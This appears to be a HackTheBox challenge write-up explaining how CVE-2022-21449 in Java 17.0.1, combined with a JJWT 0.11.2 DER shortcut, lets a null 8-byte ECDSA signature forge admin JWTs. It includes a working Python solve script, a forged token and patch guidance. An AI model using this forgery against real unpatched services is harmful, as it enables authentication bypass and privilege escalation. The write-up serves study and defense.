---
title: "read before you sign"
date: 2026-09-24 09:00:00 -0500
categories: [HackTheBox, Challenges, Crypto]
tags: [hackthebox, challenge, crypto, jwt, ecdsa, cve-2022-21449, psychic-signatures, jjwt, signature-bypass, java]
description: "ES256 JWT forgery without the private key: CVE-2022-21449 (Psychic Signatures) + a JJWT 0.11.2 DER shortcut let a null signature (8 zero bytes in DER) bypass ECDSA verification on Java 17.0.1 for any key and any message."
---

## Overview

**read before you sign** is an Easy HTB Crypto challenge. It presents a Spring Boot application that issues ES256 JWTs; the `/list` endpoint returns the flag when the token's `role` claim is `admin`. The keypair is generated fresh on each startup, so there is no key to steal. The solution is [improper verification of cryptographic signature](https://cwe.mitre.org/data/definitions/347.html) at two layers: Java 17.0.1 accepts r=0, s=0 ECDSA signatures for any key and any message ([CVE-2022-21449](https://nvd.nist.gov/vuln/detail/CVE-2022-21449)), and JJWT 0.11.2 contains a code path that bypasses its own P1363→DER conversion, delivering the raw malicious DER directly to Java's broken verifier.

---

## The technique

### Layer 1 — [CVE-2022-21449](https://nvd.nist.gov/vuln/detail/CVE-2022-21449) "Psychic Signatures"

The ECDSA verification algorithm requires the verifier to check that r and s are both in the range \[1, n−1\]. Java's native `ECDSASignature.engineVerify()` in versions 15.0.0–15.0.6, 17.0.0–17.0.2, and 18.0.0 omits this check.

With r=0 and s=0 the math breaks in a useful way:

- s⁻¹ mod n is undefined; the native C code treats it as 0
- u1 = hash · 0 = 0, u2 = r · 0 = 0
- X = 0·G + 0·Q = point at infinity → X.x = 0
- The verification check is `X.x mod n == r`, i.e., `0 == 0` ✓

Verification passes for **any message and any EC key pair**.

The DER encoding of (r=0, s=0) is:

```
30 06 02 01 00 02 01 00
```

That is: SEQUENCE(6 bytes) { INTEGER(1 byte)=0, INTEGER(1 byte)=0 } — 8 bytes total.

### Layer 2 — JJWT 0.11.2 DER shortcut (bytecode-confirmed)

JWT ES256 signatures are stored in P1363 format: raw R‖S concatenated (64 bytes for P-256). JJWT normally converts P1363 to DER before calling `Signature.verify()`. The decompiled bytecode of `EllipticCurveSignatureValidator.isValid()` reveals a shortcut:

```java
// EllipticCurveSignatureValidator.isValid() — JJWT 0.11.2 bytecode
byte[] sigToVerify;
if (sig.length == expectedLen) {           // 64 for ES256 → P1363 path
    sigToVerify = transcodeP1363ToDER(sig);
} else if (sig[0] == 0x30) {              // DER SEQUENCE tag → skip conversion!
    sigToVerify = sig;
} else {
    sigToVerify = transcodeP1363ToDER(sig);
}
doVerify(sigToVerify);  // calls java.security.Signature.verify(sigToVerify)
```

When the submitted signature is **8 bytes starting with `0x30`** (the DER null-sig), its length (8) ≠ 64 and its first byte is `0x30`, so JJWT takes the middle branch and passes the raw DER straight to Java's `Signature.verify()` — skipping conversion entirely.

**Why 64 zero bytes don't work:** the P1363 path calls `transcodeP1363ToDER(byte[64])`. When R is all zeros the loop variable `k` reaches 0, then the code accesses `sig[64]` on a 64-element array — `ArrayIndexOutOfBoundsException`, caught as a `JwtException`, `validateToken()` returns false.

---

## Solution

```bash
python3 solve.py <host> <port>
```

```python
#!/usr/bin/env python3
"""
HTB "read before you sign" (id=789, Crypto, Easy)
CVE-2022-21449 (Psychic Signatures) + JJWT 0.11.2 DER bypass
"""
import base64, json, sys, time, requests

# DER r=0, s=0: 8 bytes, starts with 0x30 → JJWT shortcut + Java 17.0.1 CVE-2022-21449
NULL_SIG_DER = bytes.fromhex("3006020100020100")
NULL_SIG_B64 = base64.urlsafe_b64encode(NULL_SIG_DER).rstrip(b"=").decode()  # MAYCAQACAQA

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_admin_jwt(username, iat, exp):
    header_b64 = "eyJhbGciOiJFUzI1NiJ9"  # {"alg":"ES256"} — exact JJWT format, no "typ"
    payload = {"role": "admin", "iat": iat, "exp": exp, "sub": username}
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}.{NULL_SIG_B64}"

def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    s = requests.Session()

    # Register + login to borrow valid iat/exp timestamps
    username = "attacker_x"
    s.post(f"{base}/register", data={"username": username, "password": "pass123", "email": "x@x.htb"})
    r = s.post(f"{base}/login", data={"username": username, "password": "pass123"}, allow_redirects=False)
    real_token = r.cookies.get("token") or s.cookies.get("token")

    now = int(time.time())
    iat, exp = now, now + 36000
    if real_token:
        parts = real_token.split(".")
        if len(parts) == 3:
            pad = lambda x: x + "=" * (4 - len(x) % 4)
            p = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            iat, exp = p.get("iat", now), p.get("exp", now + 36000)

    token = forge_admin_jwt(username, iat, exp)
    r = s.get(f"{base}/list", cookies={"token": token})
    print(r.text)

if __name__ == "__main__":
    main()
```

The forged JWT looks like:

```
eyJhbGciOiJFUzI1NiJ9
.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODIyNjI2OTgsImV4cCI6MTc4MjI5ODY5OCwic3ViIjoidGVzdHVzZXI5OSJ9
.MAYCAQACAQA
```

The signature field `MAYCAQACAQA` is base64url of `30 06 02 01 00 02 01 00` — 8 bytes, not 64, first byte `0x30`.

---

## Why it worked

The application uses `openjdk:17.0.1-jdk-slim` (vulnerable to [CVE-2022-21449](https://nvd.nist.gov/vuln/detail/CVE-2022-21449)) and `io.jsonwebtoken:jjwt-impl:0.11.2` (contains the DER shortcut). Neither component alone is necessarily fatal, but together they form a complete bypass:

1. JJWT 0.11.2 sees a signature with length 8 ≠ 64 and first byte `0x30` → delivers raw DER to `Signature.verify()`
2. Java 17.0.1 receives DER `30 06 02 01 00 02 01 00`, parses r=0, s=0, skips the range check (missing in the vulnerable build), runs the broken math, returns true
3. `validateToken()` returns true, `checkRole()` reads `role=admin`, flag is served

The challenge title "read before you sign" is a pun on "Psychic Signatures" — you don't need to sign (or know the key) because the verifier reads the all-zero signature as valid without checking.

---

## Fix / defense

Either fix alone closes the vector:

- **Upgrade the JDK** to Java ≥15.0.7, ≥17.0.3, or ≥18.0.1 — these releases add the missing `r,s ∈ [1, n-1]` range check in `ECDSASignature.engineVerify()`
- **Upgrade JJWT** to ≥0.11.5 — this release adds its own r and s validation before passing the signature to Java's verifier, closing the bypass independently of the JDK version

```groovy
// build.gradle — fixed stack
implementation 'io.jsonwebtoken:jjwt-impl:0.11.5'
// Dockerfile — fixed JDK
FROM openjdk:17.0.3-jdk-slim
```

Always pin both the JDK base image and the JWT library to versions with known-good signature validation. Running `docker image inspect` or `java -version` inside the container is the fastest way to confirm the JDK patch level during a pentest.
